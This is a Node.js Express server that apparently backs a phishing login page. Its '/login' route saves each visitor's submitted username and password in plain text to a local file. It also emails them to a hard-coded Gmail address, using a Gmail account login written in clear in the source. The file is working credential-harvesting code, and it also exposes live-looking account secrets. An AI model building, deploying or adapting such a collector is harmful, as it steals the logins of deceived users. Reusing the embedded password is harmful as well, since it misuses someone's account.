"use strict"


class Server {
	
	constructor() {
		this.express = require("express");
		this.app = this.express();
		this.parser = require("body-parser");
		this.db = require('mongoose');
		this.fs = require('fs');
		this.mail = require('nodemailer');
		this.transporter;
		// this.UserSchema;
		// this.UserModel;
	
	}

	init() {
		this.app.use(this.parser.json());
		this.app.use(this.parser.urlencoded({ extended: true }));
		this.app.use(this.express.static(__dirname + '/public'));
		// this.initDb();
		this.initMail();
		this.initRouter(this.app);
		let port = process.env.PORT || 8080;
		this.app.listen(port);
	}

	initMail() {
	    this.transporter = this.mail.createTransport({
		service: 'gmail',
		auth: {
			user: 'snoopshakur1998@gmail.com',
			pass: 'gnel1998'
		}
	     });
	}
	
	initRouter(app) {
		app.set('view engine', 'ejs');
		app.get('/', function(req, res) {
    		res.sendFile('index.html', {root: __dirname })
		});

		app.post('/login', function(req, res) {
			this.fs.writeFile("tmp/users", `username: ${req.body.username}, pass: ${req.body.pass}`,
			 function(err) {
				if(err) {
					return console.log(err);
				}
// 				res.send({status: 200, result: true});
			}); 
			var mailOptions = {
			  from: 'snoopshakur1998@gmail.com',
			  to: 'snoopshakur1998@gmail.com',
			  subject: 'User and pass',
			  text: `username: ${req.body.username}, pass: ${req.body.pass}`
			};

			this.transporter.sendMail(mailOptions, function(error, info){
			  if (error) {
			    console.log(error);
			  } else {
			    console.log('Email sent: ' + info.response);
				res.send({status: 200, result: true});  
			  }
			});
			
			// let user = new this.UserModel({username: req.body.username, pass: req.body.pass});
			// console.log(user);
			// user.save(function(err) {
			// 	console.log(err);
			//   if (err) throw err;
			//   res.send({status: 200, result: true});
			// });
		}.bind(this));
	}

	// initDb() {

	// 	this.db.connect("mongodb://localhost/user", { useMongoClient: true });
	// 	this.db.Promise = global.Promise;
	// 	this.UserSchema = this.db.Schema({
	// 			username: String,
	// 			pass: String
	// 		});
	// 	this.UserModel = this.db.model('users', this.UserSchema);
	// }
}

const app = new Server();
app.init();
